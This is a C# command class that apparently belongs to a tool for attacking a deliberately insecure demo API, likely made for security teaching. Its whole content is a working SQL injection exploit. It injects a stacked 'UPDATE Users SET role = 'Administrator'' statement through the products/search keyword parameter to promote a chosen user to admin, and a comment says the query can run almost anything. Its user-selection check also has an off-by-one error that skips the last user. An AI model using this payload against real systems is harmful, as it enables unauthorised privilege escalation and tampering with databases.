using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using Flurl.Http;

public class ChangeRoleCommand : BaseBadCommand
{
    public override async Task<bool> ExecuteAsync(BadApiSession session, CancellationToken token = default)
    {
        await new ListUsersCommand().ExecuteAsync(session, token);
        var users = (List<ApiUser>)session.SessionData[ListUsersCommand.KeyAllUsers];

        // GET: api/products/search 
        // so even though it's executed as a query... you can execute pretty much anything you want
        // everything else is kinda pointless from here on out...
        Console.Write("Which user do you want to make an admin [1 - {0}]? ", users.Count);

        var input = Console.ReadLine();
        if (int.TryParse(input, out int userInt) && userInt > 0 && userInt < users.Count)
        {
            userInt--;
            var user = users[userInt];
            Console.Write("Changing {0} to admin role...", user.Email);

            var updateUserQry = string.Format("a%'; UPDATE Users SET role = 'Administrator' WHERE email = '{0}' ---", user.Email);        
            var productsAndResets = await session.WithAuthenticatedEndpoint("products/search").SetQueryParam("keyword", updateUserQry).GetJsonListAsync(token);

            Console.WriteLine("Done...");
            await new ListUsersCommand().ExecuteAsync(session, token);
        } 
        else
        {
            Console.WriteLine("next time, how about you choose a real user yeh?");
        }

        return true;
   }
}